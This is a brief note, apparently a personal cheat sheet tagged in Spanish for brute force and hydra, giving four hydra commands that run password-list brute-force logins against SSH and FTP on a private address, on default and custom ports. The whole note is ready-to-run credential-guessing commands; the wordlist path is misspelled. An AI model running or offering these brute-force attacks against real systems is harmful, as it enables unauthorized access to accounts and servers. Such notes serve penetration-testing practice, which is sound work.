- Tags : #fuerza_bruta #hydra

```bash
#SSH
hydra -l user -P /usr/share/rockyu/rockyu.txt ssh://172.0.0.2  #22 port default
hydra -l user -P /usr/share/rockyu/rockyu.txt ssh://172.0.0.2 -s 456
#FTP
hydra -l user -P /usr/share/rockyu/rockyu.txt ftp://172.0.0.2 #21 port default
hydra -l user -P /usr/share/rockyu/rockyu.txt ftp://172.0.0.2 -s 5000
```